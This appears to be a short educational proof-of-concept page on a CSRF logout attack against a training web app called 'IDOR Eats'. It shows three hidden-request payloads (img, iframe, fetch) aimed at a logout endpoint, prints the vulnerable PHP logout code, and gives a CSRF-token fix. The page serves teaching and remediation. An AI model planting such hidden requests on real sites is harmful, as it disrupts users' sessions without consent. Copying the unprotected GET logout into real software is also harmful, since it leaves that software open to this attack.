CSRF Logout Attack POC

⚠️ Attack Demonstration:

This page demonstrates how an attacker can force a logged-in user to logout without their knowledge.

Attack Vectors:

Vector 1: Hidden Image Request

<img src="http://target.com/logout.php" style="display:none">

Vector 2: Hidden IFrame Request

<iframe src="http://target.com/logout.php" style="display:none"></iframe>

Vector 3: Fetch API Request

fetch('http://target.com/logout.php')
  .then(r => console.log('Victim logged out'))

How It Works:

  1. User logs into IDOR Eats (example.com)
  2. User visits attacker's malicious page (attacker.com)
  3. Browser automatically includes user's session cookie in request
  4. Request is sent to /logout.php (GET request, no CSRF token required)
  5. Server receives valid session cookie and destroys the session
  6. User is logged out without their knowledge

Vulnerability Details:

<?php
session_start();
session_destroy(); // No CSRF token verification!
header('Location: login.php');
exit();
?>

The Problem:

  • No CSRF token validation
  • GET request (should be POST)
  • No SameSite cookie attribute
  • No confirmation required

Remediation:

// In logout.php:
session_start();

// Verify CSRF token
if (!isset($_POST['csrf']) || $_POST['csrf'] !== $_SESSION['csrf_token']) {
  http_response_code(403);
  die('CSRF validation failed');
}

session_destroy();
header('Location: login.php');
